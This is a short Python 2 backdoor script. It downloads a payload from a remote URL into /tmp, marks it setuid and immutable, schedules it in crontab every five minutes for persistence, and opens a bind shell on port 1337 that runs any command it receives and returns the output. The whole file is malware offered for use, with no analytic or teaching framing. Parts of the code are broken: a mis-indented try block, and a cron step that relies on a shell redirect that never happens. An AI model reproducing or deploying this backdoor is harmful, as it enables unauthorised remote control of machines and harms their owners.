#!/usr/bin/env python
from socket import *
import subprocess
import thread

LHOST = ''
LPORT = 1337
PAYLOAD = 'http://target/payload'

def runcmd(cmd):
	#command as array ['ls', '/']
	try:
	p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	out = p.stdout.read()
	except:
		pass
	return out
	
def persistence():
	#Payload drop
	wget = ['wget', PAYLOAD, '-O', '/tmp/partyTime']
	sticky  = ['chmod', '+s', '/tmp/partyTime']
	chattr = ['chattr', '+i', '/tmp/partyTime']
	runcmd(wget)
	runcmd(sticky)
	runcmd(chattr)
	#cron
	crontask = ['echo', '*/5 * * * *  /tmp/partyTime', '>', '/tmp/cron']
	cron = ['crontab', '/tmp/cron']
	runcmd(crontask)
	runcmd(cron)


def listener():
	s = socket(AF_INET, SOCK_STREAM)
	s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
	s.bind((LHOST,LPORT))
	s.listen(10)
	conn,addr = s.accept()
	while 1:
		data = conn.recv(1024)
		#command example: ls##~/##
		cmd = data.split('##')
		cmd.pop()
		try:
			out = runcmd(cmd)
			conn.send(out)
		except:
			pass
	conn.close()
if __name__ == "__main__":
	persistence()
	thread.start_new_thread(listener, ())
	while 1:
		pass
